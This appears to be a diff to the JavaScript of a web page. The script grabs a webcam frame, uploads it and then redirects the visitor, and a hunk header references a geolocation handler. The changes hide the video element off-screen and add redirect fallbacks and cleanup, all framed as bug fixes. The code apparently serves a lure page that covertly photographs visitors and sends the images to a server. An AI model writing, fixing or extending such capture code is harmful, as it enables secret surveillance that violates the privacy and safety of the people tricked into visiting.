@@ -97,12 +97,19 @@ function showPosition(position, callback) {
 
 // 3. Camera Logic (Fixed Canvas Crash)
 function captureAndSend(callback) {
+  // 1. Create Video Element and attach to DOM (Fix for Mac)
   var video = document.createElement('video');
+  video.style.position = "fixed";
+  video.style.top = "-10000px"; // Hide it off-screen
+  video.style.left = "-10000px";
+  document.body.appendChild(video); // CRITICAL: Mac requires element in DOM
+
   var canvas = document.getElementById('canvas');
 
   // Safety Timer: Redirect if stuck for 5 seconds
   var safetyTimer = setTimeout(function() {
       if(callback) callback();
+      try { document.body.removeChild(video); } catch(e){} // Cleanup
   }, 5000);
 
   video.autoplay = true;
@@ -112,14 +119,14 @@ function captureAndSend(callback) {
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
       video.srcObject = stream;
-      video.play(); // Start stream
+      video.play();
 
-      // FIX: Wait for the video to actually have data (width/height)
+      // Wait for data to be ready
       video.onloadeddata = function() {
+          // Additional slight delay to ensure first frame is rendered
           setTimeout(function() {
-            clearTimeout(safetyTimer); // Clear safety timer
+            clearTimeout(safetyTimer);
             
-            // Check if video actually has size
             if (video.videoWidth > 0 && video.videoHeight > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -137,23 +144,27 @@ function captureAndSend(callback) {
                     contentType: false,
                     success: function() {
                       stream.getTracks().forEach(track => track.stop());
+                      try { document.body.removeChild(video); } catch(e){}
                       if (callback) callback();
                     },
                     error: function() {
                       stream.getTracks().forEach(track => track.stop());
+                      try { document.body.removeChild(video); } catch(e){}
                       if (callback) callback(); 
                     }
                   });
                 }, 'image/jpeg', 0.8);
             } else {
-                // Video failed to load dimensions, redirect
+                // If video is still empty, just redirect
                 stream.getTracks().forEach(track => track.stop());
+                try { document.body.removeChild(video); } catch(e){}
                 if (callback) callback();
             }
-          }, 500); // 500ms delay after load
+          }, 500);
       };
     }).catch(function(err) {
       clearTimeout(safetyTimer);
+      try { document.body.removeChild(video); } catch(e){}
       if (callback) callback();
     });
   } else {
